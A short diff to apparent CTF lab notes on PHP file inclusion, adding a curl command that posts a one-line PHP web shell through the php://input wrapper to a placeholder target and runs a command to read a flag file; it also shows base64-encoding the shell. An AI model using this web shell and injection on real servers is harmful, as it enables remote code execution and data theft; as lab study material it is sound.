@@ -8,3 +8,5 @@ With allow_url_include enabled, we can proceed with our data wrapper attack. As 
 
 So, our first step would be to base64 encode a basic PHP web shell, as follows:
 > [!bash!]$ echo '<?php system($_GET["cmd"]); ?>' | base64
+# Command for reading the 'flag in CTF challange
+> curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<IP>:<PORT>/index.php?language=php://input&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt"
